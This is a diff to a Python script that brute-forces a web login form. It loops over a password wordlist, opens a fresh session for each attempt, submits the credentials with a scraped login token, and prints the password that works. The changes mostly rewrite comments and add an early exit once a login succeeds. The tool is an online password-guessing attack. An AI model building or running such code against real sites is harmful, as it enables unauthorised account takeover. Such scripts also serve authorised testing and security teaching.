@@ -21,6 +21,7 @@ def logUnknownError(password, html):
         file.write(html)
 
 
+# Check if the returned HTML is a valid login
 def checkLogin(response):
     soup = BeautifulSoup(response.text, "html.parser")
 
@@ -35,6 +36,7 @@ def checkLogin(response):
         raise Exception("Unknown error")
 
 
+# Try to input username and password and return the response
 def login(session, username, password):
     # Get login token from page
     login_token = BeautifulSoup(session.get(LOGIN_URL).text, "html.parser").find(
@@ -55,7 +57,7 @@ def login(session, username, password):
     return response
 
 
-# TODO: Return password list as list
+# Convert a wordlist file into a list
 def getPasswords(filename="passlist.txt"):
     passlist = []
     with open(filename, "r") as file:
@@ -73,18 +75,19 @@ def main():
         print("Provide username as an argument")
         return
 
-    # Iterate over each username in the list (csv)
+    # Iterate over each password in the list
     for password in getPasswords():
-        # Create a new session for each user
+        # Create a new session for each password
         with requests.session() as session:
             loginResponse = login(session, username, password)
 
         try:
             status = checkLogin(loginResponse)
 
-            # If login success, call addReport function and report in stdout
+            # If login success, report in stdout and break return
             if status:
                 print(f"{password} works for {username}")
+                return
 
             # If login failed, report in stdout
             else:
